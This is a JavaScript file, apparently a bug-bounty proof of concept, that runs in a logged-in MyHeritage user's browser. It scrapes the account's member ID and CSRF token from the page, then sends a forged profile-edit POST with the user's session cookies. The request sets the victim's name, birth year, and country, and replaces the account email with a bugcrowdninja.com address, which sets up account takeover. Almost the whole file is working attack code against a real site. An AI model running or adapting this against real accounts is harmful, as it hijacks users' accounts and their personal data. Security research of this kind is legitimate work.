// MyHeritage Profile Auto-Editor
(async () => {
    console.log('[AutoEdit] Starting profile auto-edit...');

    // Step 1: Check current URL and extract site ID
    const currentURL = window.location.href;
    const urlParams = new URLSearchParams(window.location.search);
    let siteID = urlParams.get('s');
    let memberID = null;

    // If we have 's' parameter in URL, use it
    if (siteID) {
        console.log('[AutoEdit] Site ID from URL parameter:', siteID);
    } else {
        // Try to extract from pathname for family-sites URLs
        const pathMatch = window.location.pathname.match(/\/family-sites\/[^\/]+\/([A-Z0-9]+)/);
        if (pathMatch) {
            siteID = pathMatch[1];
            console.log('[AutoEdit] Site ID from pathname:', siteID);
        }
    }

    // If still no siteID, we need to redirect to home first to get it
    if (!siteID) {
        console.log('[AutoEdit] No site ID found. Redirecting to home page...');
        window.location.href = 'https://www.myheritage.com';
        return;
    }

    // Step 2: Extract memberID from page source
    // Try to find in global variable
    if (typeof currentUserAccountID !== 'undefined') {
        memberID = currentUserAccountID;
    } else {
        // Parse from page source
        const bodyText = document.documentElement.innerHTML;
        const memberIDMatch = bodyText.match(/var currentUserAccountID\s*=\s*["']([A-Z0-9]+)["']/);
        if (memberIDMatch) {
            memberID = memberIDMatch[1];
        }
    }

    // If no memberID found, try to get it from the edit profile page
    if (!memberID) {
        console.log('[AutoEdit] Member ID not found on current page. Navigating to profile...');
        window.location.href = `https://www.myheritage.com/family-sites/home?s=${siteID}`;
        return;
    }

    console.log('[AutoEdit] Member ID:', memberID);

    // Step 3: Check if we're already on the edit profile page
    if (!currentURL.includes('memberEditProfile.php')) {
        console.log('[AutoEdit] Redirecting to edit profile page...');
        window.location.href = `https://www.myheritage.com/FP/memberEditProfile.php?s=${siteID}&memberID=${memberID}`;
        return;
    }

    // Step 4: We're on the edit profile page, extract CSRF token
    let csrfToken = null;
    const pageText = document.documentElement.innerHTML;
    
    // Try multiple patterns for CSRF token
    const csrfPatterns = [
        /csrf_token=([^&'"]+)/,
        /name="csrf_token"\s+value="([^"]+)"/,
        /'csrf_token'\s*:\s*'([^']+)'/
    ];

    for (const pattern of csrfPatterns) {
        const match = pageText.match(pattern);
        if (match) {
            csrfToken = match[1];
            break;
        }
    }

    if (!csrfToken) {
        console.error('[AutoEdit] Could not find CSRF token');
        return;
    }
    console.log('[AutoEdit] CSRF Token:', csrfToken);

    // Step 5: Prepare the POST data
    const formData = new URLSearchParams({
        memberID: memberID,
        isPostBack: '1',
        origin: 'member',
        s: siteID,
        gender: 'M',
        firstName: 'Testing',
        lastName: 'JS',
        month: '00',
        day: '0',
        year: '1950',
        country: 'MA',
        state: '',
        province: '',
        zipCode: '',
        preferredLang: 'EN',
        interests: 'naysser+hacked@bugcrowdninja.com',
        oldPassword: '',
        newPassword: '',
        confirmNewPassword: '',
        isChangePasswordOpen: '0',
        email: 'naysser+1@bugcrowdninja.com',
        currentPassword: '',
        isChangeEmailOpen: '0',
        deleteAccountConfirmationPassword: '',
        csrf_token: csrfToken
    });

    // Step 6: Submit the POST request
    console.log('[AutoEdit] Submitting profile changes...');
    try {
        const postResponse = await fetch(`https://www.myheritage.com/FP/memberEditProfile.php?s=${siteID}&memberID=${memberID}&sourceList=`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: formData.toString(),
            credentials: 'include'
        });

        if (postResponse.ok) {
            console.log('[AutoEdit] Profile updated successfully!');
            alert('Profile has been automatically updated!');
            // Redirect to profile to see changes
            window.location.href = `https://www.myheritage.com/family-sites/home?s=${siteID}`;
        } else {
            console.error('[AutoEdit] Failed to update profile. Status:', postResponse.status);
        }
    } catch (error) {
        console.error('[AutoEdit] Error submitting profile changes:', error);
    }
})();
